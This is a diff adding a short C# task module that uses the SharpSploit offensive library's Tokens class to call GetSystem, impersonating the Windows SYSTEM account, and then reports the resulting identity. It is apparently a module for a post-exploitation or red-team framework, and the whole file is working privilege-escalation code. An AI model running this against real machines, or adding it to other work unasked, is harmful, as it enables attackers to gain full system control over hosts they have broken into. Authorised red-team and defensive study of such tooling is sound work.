@@ -1,0 +1,21 @@
+﻿using System;
+
+using SharpSploit.Credentials;
+
+public static class Task
+{
+    public static string Execute()
+    {
+        using (Tokens t = new Tokens())
+        {
+            if (t.GetSystem())
+            {
+                return "Successfully impersonated: " + t.WhoAmI();
+            }
+            else
+            {
+                return "Failed to GetSystem";
+            }
+        }
+    }
+}
